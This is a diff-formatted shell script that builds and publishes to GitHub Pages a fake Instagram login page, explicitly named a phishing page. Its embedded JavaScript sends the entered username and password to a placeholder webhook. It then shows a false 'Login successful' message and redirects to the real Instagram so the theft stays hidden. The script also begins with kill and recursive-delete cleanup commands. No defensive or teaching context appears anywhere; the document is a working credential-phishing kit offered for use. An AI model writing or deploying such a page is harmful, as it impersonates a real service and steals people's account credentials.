@@ -1,0 +1,67 @@
+# Clean up previous
+pkill -f python; rm -f app.py; rm -rf phishing-page
+
+# Create static GitHub Pages repo
+mkdir phishing-page && cd phishing-page
+cat > index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <style>
+        body { background:#fafafa; font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin:0; padding:0; }
+        .container { max-width:350px; margin:100px auto; padding:40px; background:white; border:1px solid #dbdbdb; border-radius:4px; }
+        .ig-logo { font-size:48px; color:#262626; font-weight:300; text-align:center; margin-bottom:30px; }
+        input { width:100%; padding:12px; margin:8px 0; border:1px solid #dbdbdb; border-radius:3px; box-sizing:border-box; font-size:14px; }
+        .btn { background:#0095f6; color:white; border:0; padding:8px 16px; border-radius:5px; cursor:pointer; width:100%; font-weight:600; font-size:14px; }
+        .btn:hover { background:#1877f2; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="ig-logo">Instagram</div>
+        <form id="loginForm">
+            <input name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button class="btn" type="submit">Log in</button>
+        </form>
+        <div id="status" style="text-align:center; margin-top:20px; color:#ed4956; font-size:12px;"></div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+            
+            // Send to your webhook/endpoint
+            fetch('https://YOUR-WEBHOOK-URL/webhook', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    ip: 'CLIENT_IP_HERE', // GitHub Pages can't get real IP easily
+                    user: data.username,
+                    pass: data.password,
+                    ua: navigator.userAgent,
+                    url: window.location.href
+                })
+            }).then(() => {
+                document.getElementById('status').innerHTML = 'Login successful! Redirecting...';
+                // Redirect to real Instagram after 2s
+                setTimeout(() => window.location.href = 'https://www.instagram.com/', 2000);
+            }).catch(() => {
+                document.getElementById('status').innerHTML = 'Error, try again';
+            });
+        };
+    </script>
+</body>
+</html>
+EOF
+
+# Create GitHub repo and push
+git init
+git add .
+git commit -m "Initial phishing page"
+git branch -M main
+git remote add origin https://github.com/YOURUSERNAME/YOUR-REPO-NAME.git
+git push -u origin main
